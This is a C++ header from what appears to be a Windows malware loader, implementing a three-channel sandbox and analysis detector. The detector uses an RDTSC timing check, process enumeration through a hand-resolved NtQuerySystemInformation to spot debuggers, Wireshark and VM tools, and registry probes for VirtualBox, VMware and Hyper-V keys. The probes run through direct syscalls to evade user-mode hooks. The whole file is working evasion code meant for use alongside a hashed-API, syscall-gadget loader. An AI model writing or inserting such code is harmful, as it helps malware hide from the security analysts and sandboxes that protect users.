// =============================================================================
// anti_triadic.h – Tripolar Resilient Anti-Analysis (Timing, Artifacts, Registry)
// =============================================================================
// Three independent detection channels feed a cumulative score.
// Each channel uses native syscalls / intrinsics that are difficult to hook:
//   1. RDTSC frequency anomaly   – detects hypervisor time dilation
//   2. Process enumeration       – NtQuerySystemInformation for analysis tools
//   3. Registry introspection    – NtOpenKey for ephemeral VM artefacts
// Threshold is adaptive (≥ 5 = sandboxed) and survives partial patching.
// =============================================================================

#ifndef ANTI_TRIADIC_H
#define ANTI_TRIADIC_H

#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include "api_hashes.h"
#include "syscalls.h"

// Shared globals from loader
extern PVOID     g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// INTERNAL TYPES (avoid relying on hooker-controlled SDK headers)
// =============================================================================

// Minimal SYSTEM_PROCESS_INFORMATION for channel 2
typedef struct _SYSTEM_PROCESS_INFO_LITE {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  Reserved[3];
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    // ... (remaining fields ignored – we only need ImageName + iteration)
} SYSTEM_PROCESS_INFO_LITE;

// =============================================================================
// CHANNEL 1 — RDTSC FREQUENCY ANOMALY
// =============================================================================
// Hypervisors intercept RDTSC or apply scaling; the delta over a fixed
// wall-clock interval will deviate from the real TSC frequency.
// Score: +2 if outside [expected/2 .. expected*3]

__forceinline ULONGLONG TriadicRDTSC() {
    return __rdtsc();
}

// Reemplazar Sleep por NtDelayExecution para evitar hooks
static VOID SafeDelayExecution(DWORD ms) {
    LARGE_INTEGER delay;
    delay.QuadPart = -(ms * 10000LL); // 100ns units, negativo para relativo
    InvokeSyscall(g_ApiTable.syscalls.NtDelayExecution.ssn, g_SyscallGadget, FALSE, &delay);
}

static __forceinline INT Channel_TimingAnomaly() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    if (freq.QuadPart == 0) return 0;

    QueryPerformanceCounter(&start);
    SafeDelayExecution(100);
    QueryPerformanceCounter(&end);

    LONGLONG elapsed = end.QuadPart - start.QuadPart;
    double expected_ticks = (double)freq.QuadPart / 10.0; // 100ms
    double variance = (double)abs((long)(elapsed - (LONGLONG)expected_ticks)) / expected_ticks;

    // 10% de variación indica posible hypervisor o sandbox timing manipulation
    return (variance > 0.1) ? 2 : 0;
}

// =============================================================================
// CHANNEL 2 — PROCESS ENUMERATION VIA NtQuerySystemInformation
// =============================================================================
// Uses the resolved syscall for SystemProcessInformation (class 5) so no
// user-mode hooks on CreateToolhelp32Snapshot / EnumProcesses are triggered.
// Score: +3 per detected tool process (capped at first hit to avoid over-scoring)

// NtQuerySystemInformation SSN resolved at init time via SYSCALL_TABLE
// We invoke it through the existing InvokeSyscall trampoline.

static __forceinline INT Channel_ProcessEnumeration() {
    INT score = 0;

    // Resolve NtQuerySystemInformation from ntdll via export walk
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    if (!hNtdll) return 0;

    // Find NtQuerySystemInformation export
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    DWORD expRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA) return 0;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + expRVA);
    PDWORD pNames = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
    PWORD  pOrds  = (PWORD)((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);

    typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
    NtQuerySystemInformation_t pNtQSI = NULL;

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char *n = (const char *)((PBYTE)hNtdll + pNames[i]);
        // Match "NtQuerySystemInformation" – key chars: N[0] t[1] Q[2] S[7] I[13]
        if (n[0] == 'N' && n[2] == 'Q' && n[7] == 'S' && n[13] == 'I' && n[5] == 'y') {
            pNtQSI = (NtQuerySystemInformation_t)((PBYTE)hNtdll + pFuncs[pOrds[i]]);
            break;
        }
    }
    if (!pNtQSI) return 0;

    // Allocate buffer for process list
    ULONG bufSize = 0x40000; // 256 KB initial
    PVOID buf = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;

    // SystemProcessInformation = 5
    NTSTATUS st = pNtQSI(5, buf, bufSize, &bufSize);
    if (st != 0) {
        // Retry with returned size + slack
        VirtualFree(buf, 0, MEM_RELEASE);
        bufSize += 0x10000;
        buf = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) return 0;
        st = pNtQSI(5, buf, bufSize, &bufSize);
    }

    if (st == 0) {
        SYSTEM_PROCESS_INFO_LITE *spi = (SYSTEM_PROCESS_INFO_LITE *)buf;
        BOOL found = FALSE;

        for (;;) {
            if (spi->ImageName.Buffer && spi->ImageName.Length > 0) {
                WCHAR name[64] = {0};
                USHORT copyLen = spi->ImageName.Length / sizeof(WCHAR);
                if (copyLen > 63) copyLen = 63;

                // Manual lower-case copy (avoid wcsncpy / _wcslwr dependencies)
                for (USHORT c = 0; c < copyLen; c++) {
                    WCHAR ch = spi->ImageName.Buffer[c];
                    if (ch >= L'A' && ch <= L'Z') ch += (L'a' - L'A');
                    name[c] = ch;
                }

                // Check against known analysis / VM tool process names
                // VirtualBox
                if (name[0] == L'v' && name[1] == L'b' && name[2] == L'o' && name[3] == L'x') { score += 3; found = TRUE; }
                // vboxtray.exe
                if (name[0] == L'v' && name[3] == L'x' && name[4] == L't' && name[5] == L'r') { score += 3; found = TRUE; }
                // vmsrvc.exe (VMware)
                if (name[0] == L'v' && name[1] == L'm' && name[2] == L's' && name[3] == L'r') { score += 3; found = TRUE; }
                // vmtoolsd.exe
                if (name[0] == L'v' && name[1] == L'm' && name[2] == L't' && name[3] == L'o') { score += 3; found = TRUE; }
                // wireshark.exe
                if (name[0] == L'w' && name[1] == L'i' && name[2] == L'r' && name[3] == L'e') { score += 3; found = TRUE; }
                // procmon.exe / procmon64.exe
                if (name[0] == L'p' && name[1] == L'r' && name[2] == L'o' && name[3] == L'c' && name[4] == L'm') { score += 3; found = TRUE; }
                // x64dbg.exe / x32dbg.exe
                if (name[1] == L'6' && name[2] == L'4' && name[3] == L'd' && name[4] == L'b') { score += 3; found = TRUE; }
                if (name[1] == L'3' && name[2] == L'2' && name[3] == L'd' && name[4] == L'b') { score += 3; found = TRUE; }
                // xenservice.exe
                if (name[0] == L'x' && name[1] == L'e' && name[2] == L'n' && name[3] == L's') { score += 3; found = TRUE; }
                // fiddler.exe
                if (name[0] == L'f' && name[1] == L'i' && name[2] == L'd' && name[3] == L'd') { score += 3; found = TRUE; }
                // processhacker.exe
                if (name[0] == L'p' && name[7] == L'h' && name[8] == L'a' && name[9] == L'c') { score += 3; found = TRUE; }
                // ollydbg.exe
                if (name[0] == L'o' && name[1] == L'l' && name[2] == L'l' && name[3] == L'y') { score += 3; found = TRUE; }
                // ida.exe / ida64.exe
                if (name[0] == L'i' && name[1] == L'd' && name[2] == L'a')                    { score += 3; found = TRUE; }

                // Stop accumulating after first hit to prevent over-scoring
                if (found) break;
            }

            if (spi->NextEntryOffset == 0) break;
            spi = (SYSTEM_PROCESS_INFO_LITE *)((PBYTE)spi + spi->NextEntryOffset);
        }
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    return score;
}

// =============================================================================
// CHANNEL 3 — REGISTRY ARTEFACT INTROSPECTION VIA NtOpenKey
// =============================================================================
// Probes well-known registry keys that only exist inside virtualised
// environments (Hyper-V vmbus, VirtualBox Guest Additions, VMware Tools).
// Uses NtOpenKey resolved from ntdll exports to bypass RegOpenKeyEx hooks.
// Score: +4 per confirmed artefact

// Ofuscar rutas de registry con macro OBFUSCATE (estilo del proyecto)
#define REG_PATH_VMBUS    L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\vmbus"
#define REG_PATH_VMTOOLS  L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VMTools"
#define REG_PATH_VBOXG    L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"
#define REG_PATH_VBOXSF   L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\VBoxSF"

static __forceinline INT Channel_RegistryArtefacts() {
    INT score = 0;

    // -------------------------------------------------------------------------
    // Helper: probe a single registry path via syscall
    // -------------------------------------------------------------------------
    auto PROBE_REG_KEY = [&](const wchar_t* pathLiteral) {
        UNICODE_STRING us;
        us.Buffer = (PWSTR)pathLiteral;
        us.Length = (USHORT)(wcslen(pathLiteral) * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hKey = NULL;
        NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtOpenKey.ssn, g_SyscallGadget, &hKey, KEY_READ, &oa);
        if (status == 0) {
            InvokeSyscall(g_ApiTable.syscalls.NtClose.ssn, g_SyscallGadget, hKey);
            return 4;
        }
        return 0;
    };

    score += PROBE_REG_KEY(REG_PATH_VMBUS);
    score += PROBE_REG_KEY(REG_PATH_VMTOOLS);
    score += PROBE_REG_KEY(REG_PATH_VBOXG);
    score += PROBE_REG_KEY(REG_PATH_VBOXSF);

    return score;
}

// =============================================================================
// PUBLIC — TRIADIC ANTI-ANALYSIS ORACLE
// =============================================================================
// Returns TRUE if the environment is likely sandboxed/virtualised.
// Threshold of 5 requires at least:
//   • timing + 1 tool    (2+3)
//   • timing + 1 reg key (2+4)  – note: just 1 reg key alone is +4, not enough
//   • 2 tool processes   (3+3)  – confirms redundancy
//   • 1 reg key + 1 tool (4+3)
// This ensures false positives from a single noisy channel are suppressed.

static BOOL TriadicIsSandboxed() {
    INT score = 0;

    // Channel 1: timing
    score += Channel_TimingAnomaly();

    // Channel 2: process artefacts
    score += Channel_ProcessEnumeration();

    // Channel 3: registry artefacts
    score += Channel_RegistryArtefacts();

    // Adaptive threshold
    return (score >= 5);
}

#endif
